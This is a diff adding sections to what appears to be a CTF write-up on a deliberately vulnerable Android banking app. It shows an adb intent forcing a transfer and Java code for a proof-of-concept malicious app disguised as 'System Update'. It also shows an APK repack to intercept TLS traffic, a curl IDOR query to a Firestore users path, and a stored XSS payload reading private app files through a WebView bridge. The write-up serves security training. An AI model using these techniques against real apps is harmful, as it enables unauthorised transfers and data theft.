@@ -186,18 +186,180 @@ The attack is successful because the application lacks server-side verification.
 
 <img width="1920" height="1080" alt="Screenshot_2026-04-21_22_52_42" src="https://github.com/user-attachments/assets/583da2c3-d5a8-4f41-a534-08b255f9fbb2" />
 
+## 5.TransferActivity - External Intent Vulnerability (CWE-927)
+
+**Vulnerability Type**
+
+CWE-927: Use of Implicit Intent for Sensitive Communication
+
+**Description**
+
+The TransferActivity is exported and contains a logic flaw in the checkExternalIntent() method. It listens for external intents containing specific extras (auto_transfer_amount and target_card). If these extras are present, the application automatically populates the transfer fields and initiates a transaction without any user confirmation or origin validation.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-21_22_58_12" src="https://github.com/user-attachments/assets/fcb43a3e-fa02-4326-bfc0-5190e811e4bc" />
+
+**Static Analysis**
+
+In the AndroidManifest.xml, we can see that TransferActivity is set to android:exported="true", making it accessible to any other application on the device.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-21_23_00_30" src="https://github.com/user-attachments/assets/deff5371-f4ab-4a75-b95f-655571463458" />
+
+In the source code (JADX), the checkExternalIntent() method processes these values and triggers processTransaction() after a short delay:
+
+if (intent.hasExtra("auto_transfer_amount") && intent.hasExtra("target_card")) {
+    // ... logic to auto-fill and process ...
+    android.util.Log.d("CTF_EXTERNAL", "FLAG{3xt3rn4l_int3nt_4bus3}");
+}
+
+**Exploitation (POC)**
+
+We can exploit this by sending a crafted Intent via ADB. This simulates a malicious app on the device trying to force a bank transfer.
+
+adb shell am start -n com.global.mygoldbank/.TransferActivity \
+  --es auto_transfer_amount "1000" \
+  --es target_card "1234567891234567"
+
+  <img width="1920" height="1080" alt="Screenshot_2026-04-21_22_59_04" src="https://github.com/user-attachments/assets/50a03dec-eb0a-4f26-97a5-07a084b6dcfe" />
+
+## 6.Real-World Exploit Scenario: Malicious App Integration
+
+**Concept**
+
+To demonstrate the severity of the External Intent Vulnerability, I developed a proof-of-concept (PoC) malicious application disguised as a system utility named "System Update" (com.hacker.malicious).
+
+**Attack Mechanism**
+
+The malicious app runs a background service (SilentExploitService) that monitors the device state. Once triggered, it programmatically sends a crafted implicit intent to the MyGlobalBank application.
+
+**The Code (Malicious App):**
+
+The attacker's app uses the following logic to trigger the transfer without any user interaction:
+
+Intent intent = new Intent();
+intent.setComponent(new ComponentName("com.global.mygoldbank", "com.global.mygoldbank.TransferActivity"));
+intent.putExtra("auto_transfer_amount", "5000");
+intent.putExtra("target_card", "4444333322221111");
+intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+startActivity(intent);
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-21_23_24_49" src="https://github.com/user-attachments/assets/306ad325-7527-468e-ab7d-1cf1c7077d03" />
+
+Background Trigger: As seen in the screenshots, the malicious app starts the exploit service.
+
+Automated Transfer: The TransferActivity of the bank app is forced into the foreground, automatically processes a $5000 transfer to the attacker's card.
 
 
+<img width="1920" height="1080" alt="Screenshot_2026-04-21_23_25_08" src="https://github.com/user-attachments/assets/cc85e9fd-01ed-4b5e-b1f4-62459b5c6064" />
+
+## 7.RequestActivity - IDOR & Information Disclosure (CWE-639)
+
+**Vulnerability Type**
+
+CWE-639: Insecure Direct Object Reference (IDOR)
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_12_25" src="https://github.com/user-attachments/assets/4ee81327-0cc8-4ff9-8137-d7dabecbabdd" />
+
+## Bypassing SSL Pinning & Traffic Inspection Setup
+
+**The Challenge**
+
+To perform an IDOR attack by intercepting backend requests, we must monitor the application's HTTPS traffic. However, modern Android versions do not trust user-installed CA certificates by default, which prevents tools like Charles Proxy from decrypting the traffic.
+
+**Modifying Network Security Configuration**
+
+To bypass this restriction, I de-compiled the APK and modified the network security settings to explicitly trust user-installed certificates.
+
+**Step 1: Creating the Configuration**
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_14_16" src="https://github.com/user-attachments/assets/437416b0-0649-44eb-b841-31481f144b96" />
+
+I created a new file at res/xml/network_security_config.xml with the following rules:
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_14_27" src="https://github.com/user-attachments/assets/734b7ccd-a91a-4876-81b0-89842801b50a" />
+
+**Step 2: Updating the Android Manifest**
+
+To apply this configuration, I modified the <application> tag in the AndroidManifest.xml to include the networkSecurityConfig attribute:
+
+<application
+    ...
+    android:networkSecurityConfig="@xml/network_security_config"
+    ...>
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_15_18" src="https://github.com/user-attachments/assets/16cefba7-b585-4a8f-978b-f53d472133db" />
+
+After modifying the network security configurations, the APK must be recompiled and signed to be functional. I used Apktool to build the modified project, but I encountered several resource errors related to color definitions in res/values/colors.xml.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_30_55" src="https://github.com/user-attachments/assets/50e03d8b-8acd-41aa-a435-450989125f24" />
+
+Since Android requires all applications to be digitally signed, I used keytool to generate a custom keystore named mybank.keystore and then applied the signature using jarsigner. This manual signing process is critical because it allows the device to install the patched APK as a trusted package.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_34_01" src="https://github.com/user-attachments/assets/9c174914-078a-4e68-80b2-247a221cd506" />
+
+Next, we use a tool called Charles Proxy. Charles Proxy is an HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL/TLS traffic between their machine and the Internet. In our mobile penetration testing scenario, it acts as a "Man-in-the-Middle," allowing us to intercept, inspect, and even modify the data being sent and received by the application in real-time.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_36_44" src="https://github.com/user-attachments/assets/625af455-7320-4a5f-9eca-c8aef0a52de9" />
+
+With the patched and signed APK now running on the device, we launch Charles Proxy to begin the monitoring process.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_37_40" src="https://github.com/user-attachments/assets/3ee60856-02ed-4de0-bf0a-d33915ba3ec2" />
+
+In the Charles Proxy settings, we configure the port to 8888 
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_38_27" src="https://github.com/user-attachments/assets/85e105cd-817d-4d1d-ac49-c2b8369f633f" />
+
+Enable SSL Proxying by adding *.* to the locations to intercept all incoming and outgoing traffic.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_38_37" src="https://github.com/user-attachments/assets/6af346ee-2789-4c93-9f71-b980f825fa57" />
+
+To link the device, we identify the machine's local IP address from the wlan0 interface via the Help menu and enter this IP, along with port 8888, into the Android device's manual proxy settings.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_39_15" src="https://github.com/user-attachments/assets/72c67116-7e9a-47a7-92e0-3d27f6d9481b" />
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_42_00" src="https://github.com/user-attachments/assets/893a757a-e780-4abe-b08b-cb34c00e2367" />
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_42_50" src="https://github.com/user-attachments/assets/77602310-7fbb-48af-8b47-d634daa59908" />
 
 
+Next, we navigate back to the SSL Proxying menu in Charles to save the Charles Root Certificate, which is exported as a .pem file. This certificate must be transferred to the Android device and installed via the "Install from storage" option within the system's Security/Encryption settings (Trusted Credentials) to allow the device to trust the proxy's intercepted traffic.
 
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_41_49" src="https://github.com/user-attachments/assets/7d5a7e52-b18a-4dcd-8527-b866cfa66ac6" />
 
+Once the setup is complete, we select Start SSL Proxying and Start Recording in Charles. We then perform a "Request Money" transaction to the victim's card number (4444333322221111).
 
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_43_55" src="https://github.com/user-attachments/assets/bf7f19bb-7707-4529-bfcb-c387008b1d19" />
 
+By monitoring the live traffic, we can clearly see the request being routed to the Firestore backend at the /users/ endpoint.
 
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_44_15" src="https://github.com/user-attachments/assets/742c0c45-ceb1-4513-b384-23f9359b1e7a" />
 
+**Using the extracted REST API path, we execute a final cURL command:**
 
+curl -X GET "https://firestore.googleapis.com/v1/projects/myglobalbank-b212d/databases/(default)/documents/users/victim"
 
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_46_55" src="https://github.com/user-attachments/assets/9c221e7f-1136-450e-9fe3-e7537f9b0035" />
+
+## 8.NewsActivity - File Access via WebView (CWE-552)
+
+The NewsActivity contains a critical security flaw involving the WebView component. Static analysis reveals that the WebView has allowFileAccess enabled and, more importantly, exposes a custom JavaScript interface named CTFFileReader.
+
+This interface acts as a bridge between the web content and the Android native Java code, allowing JavaScript to execute sensitive file system operations.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_55_40" src="https://github.com/user-attachments/assets/5c252493-27a8-4287-be2c-f62458edb618" />
+
+By injecting a stored XSS payload into the news database, I was able to force the application to execute JavaScript when a user views the news feed.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_56_24" src="https://github.com/user-attachments/assets/83f76d89-50a1-4fb9-a180-51f37cf4df9c" />
+
+I used the following payload to interact with the exposed interface:
+
+'); CTFFileReader.listFiles('/data/data/com.global.mygoldbank/databases'); //
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_57_08" src="https://github.com/user-attachments/assets/d00132be-bf51-46ec-a572-790d874c7e42" />
+
+This exploit successfully bypassed the application's sandbox. By calling the listFiles method through the WebView, I was able to list the contents of the internal /databases directory.
+
+<img width="1920" height="1080" alt="Screenshot_2026-04-22_07_58_13" src="https://github.com/user-attachments/assets/7ea492a2-5973-46de-97da-7e1ed0578e34" />
 
 
 
